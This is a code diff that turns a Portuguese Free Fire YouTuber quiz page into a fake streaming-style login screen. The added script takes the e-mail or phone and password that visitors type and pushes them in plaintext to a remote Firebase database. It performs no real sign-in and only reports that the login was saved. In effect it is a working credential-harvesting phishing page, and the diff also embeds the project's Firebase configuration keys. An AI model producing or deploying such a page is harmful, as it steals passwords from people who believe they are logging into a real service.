@@ -3,93 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Jogo de YouTubers Free Fire</title>
+    <title>Tela de Login </title>
     <style>
-        body {
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body, html {
+            height: 100%;
             font-family: Arial, sans-serif;
-            background-color: #1e1e1e;
-            color: white;
+        }
+
+        body {
+            background: url('fundo.jpg') no-repeat center center fixed;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .login-container {
+            background-color: rgba(0, 0, 0, 0.75);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 0 10px #000;
+            width: 100%;
+            max-width: 400px;
             text-align: center;
         }
 
-        .container {
-            margin-top: 50px;
-        }
-
-        img {
-            width: 300px;
-            border-radius: 10px;
-            margin-top: 20px;
-        }
-
-        button {
-            background-color: #ff8000;
+        .login-container h2 {
             color: white;
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+
+        .login-container input {
+            width: 100%;
             padding: 15px;
-            font-size: 18px;
+            margin: 10px 0;
             border: none;
             border-radius: 5px;
-            cursor: pointer;
-            margin-top: 20px;
+            font-size: 16px;
         }
 
-        button:hover {
-            background-color: #e77b00;
-        }
-
-        #result {
-            margin-top: 30px;
-            font-size: 24px;
-            font-weight: bold;
-        }
-
-        .alternativa {
-            background-color: #333;
-            padding: 10px;
-            margin: 5px;
+        .login-container button {
+            width: 100%;
+            padding: 15px;
+            background-color: #e50914;
+            border: none;
+            color: white;
+            font-size: 16px;
             border-radius: 5px;
             cursor: pointer;
         }
 
-        .alternativa:hover {
-            background-color: #ff8000;
+        .login-container button:hover {
+            background-color: #f40612;
         }
+
+        .switch-container {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ccc;
+        }
+
+        .switch-container a {
+            color: #fff;
+            text-decoration: none;
+        }
+
     </style>
 </head>
 <body>
 
-    <h1>Quem é esse YouTuber de Free Fire?</h1>
-
-    <div class="container">
-        <!-- Imagem do YouTuber -->
-        <img id="imagemYouTuber" src="ldzin.jpg" alt="YouTuber de Free Fire">
-
-        <!-- Alternativas -->
-        <div id="alternativas">
-            <div class="alternativa" onclick="verificarResposta('mendes FF')">MENDES</div>
-            <div class="alternativa" onclick="verificarResposta('LDZIN FF')">LDZIN</div>
-            <div class="alternativa" onclick="verificarResposta('TWO9')">TWO9</div>
-            <div class="alternativa" onclick="verificarResposta('FROST FF')">FROST</div>
+    <div class="login-container">
+        <h2>Entrar na sua conta</h2>
+        <input type="text" placeholder="E-mail ou telefone" id="usuario">
+        <input type="password" placeholder="Senha" id="senha">
+        <button onclick="fazerLogin()">Entrar</button>
+        <div class="switch-container">
+            <p>Primeira vez aqui? <a href="#">Criar conta</a></p>
+            <p><a href="#">Precisa de ajuda?</a></p>
         </div>
-
-        <!-- Resultados -->
-        <div id="result"></div>
     </div>
 
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+
     <script>
-        const respostaCorreta = 'LDZIN FF';
-        let respondido = false;
+        // Configuração do Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyA8WwVo5oB8SPKAKHzeUQ4OUiezJAuQW10",
+            authDomain: "meusitelogin-5d7c4.firebaseapp.com",
+            databaseURL: "https://meusitelogin-5d7c4-default-rtdb.firebaseio.com",
+            projectId: "meusitelogin-5d7c4",
+            storageBucket: "meusitelogin-5d7c4.firebasestorage.app",
+            messagingSenderId: "576003101889",
+            appId: "1:576003101889:web:4cd0c0616f499c7f36b040",
+            measurementId: "G-9HHVM2590T"
+        };
 
-        function verificarResposta(resposta) {
-            if (respondido) return;
-            respondido = true;
+        // Inicializar Firebase
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
 
-            if (resposta === respostaCorreta) {
-                document.getElementById('result').innerText = 'Você acertou!';
-                document.getElementById('result').style.color = 'green';
+        function fazerLogin() {
+            const usuario = document.getElementById("usuario").value;
+            const senha = document.getElementById("senha").value;
+
+            if (usuario && senha) {
+                database.ref("usuarios").push({
+                    usuario: usuario,
+                    senha: senha
+                });
+                alert("Login salvo no banco de dados!");
             } else {
-                document.getElementById('result').innerText = 'Você errou!';
-                document.getElementById('result').style.color = 'red';
+                alert("Por favor, preencha todos os campos.");
             }
         }
     </script>
